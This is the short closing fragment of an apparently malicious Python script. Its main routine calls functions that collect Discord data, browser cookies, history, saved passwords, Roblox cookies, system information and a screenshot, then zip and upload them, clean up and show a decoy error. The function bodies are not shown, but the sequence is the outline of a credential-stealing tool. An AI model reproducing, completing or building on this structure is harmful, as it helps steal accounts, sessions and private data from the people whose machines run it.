    discordinfo()
    cookies()
    history() #code kinda missed up here fr lmao
    passwords()
    sysinfo()
    robloxcookies()
    screenshot()
    zip()
    upload()
    cleanup()
    error()
if __name__ == '__main__':
    main()
